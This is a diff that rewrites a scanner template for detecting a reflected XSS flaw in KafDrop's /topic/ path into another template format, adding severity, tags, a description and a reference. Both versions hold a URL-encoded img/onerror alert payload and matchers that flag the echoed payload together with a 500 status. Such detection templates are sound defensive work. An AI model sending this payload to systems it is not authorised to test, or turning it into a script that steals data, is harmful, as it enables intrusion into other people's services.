@@ -1,22 +1,27 @@
 id: kafdrop-xss
+
 info:
   name: KafDrop XSS
-  risk: High
-
-params:
-  - root: "{{.BaseURL}}"
+  author: dhiyaneshDk
+  severity: medium
+  tags: kafdrop,xss
+  description: A vulnerability in KafDrop allows remote unauthenticated attackers to inject arbitrary HTML and/or Javascript into the response returned by the server.
+  reference: https://github.com/HomeAdvisor/Kafdrop/issues/12
 
 requests:
   - method: GET
-    redirect: false
-    url: >-
-      {{.root}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
-    headers:
-      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
-    detections:
-      - >-
-        StatusCode() == 500 && StringSearch("response", "Kafdrop") && StringSearch("response", "<img src=x onerror=alert(2)>")
+    path:
+      - "{{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E"
 
-references:
-  - author: j3ssie
-  - repo: https://github.com/obsidiandynamics/kafdrop
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'Kafdrop'
+          - '<img src=x onerror=alert(2)>'
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 500
